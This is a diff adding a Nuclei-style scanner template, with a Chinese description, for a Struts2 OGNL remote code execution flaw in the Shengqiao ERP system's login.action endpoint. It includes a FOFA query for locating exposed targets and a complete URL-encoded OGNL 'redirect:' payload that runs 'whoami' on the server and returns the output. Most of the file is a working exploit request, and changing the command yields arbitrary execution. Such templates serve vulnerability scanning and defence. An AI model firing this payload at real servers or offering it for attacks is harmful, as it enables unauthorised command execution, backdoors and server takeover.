@@ -1,0 +1,31 @@
+id: shengqiaoERP-login_action-Struts2-rce
+info:
+  name: 圣乔ERP系统 login.action Struts2远程代码执行漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: title="圣乔ERP系统"
+    由于圣乔ERP系统使用Struts2开发框架组件，存在历史Struts2远程代码执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统命令，写入后门文件，获取服务器权限。
+  reference:
+    - https://mp.weixin.qq.com/s/zn6bZLLtzcdq5OIBj-RZlw?token=962101535&lang=zh_CN
+  tags: RCE
+
+
+http:
+  - raw:
+      - |
+        POST /erp/login.action HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+        Content-Type: application/x-www-form-urlencoded
+
+        redirect:%24%7B%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%27whoami%27%7D%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23dis%3Dnew+java.io.DataInputStream%28%23b%29%2C%23buf%3Dnew+byte%5B20000%5D%2C%23dis.read%28%23buf%29%2C%23msg%3Dnew+java.lang.String%28%23buf%29%2C%23dis.close%28%29%2C%23resp.getWriter%28%29.println%28%23msg.trim%28%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29%7D
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nt authority\'
+      - type: status
+        status: 
+          - 200
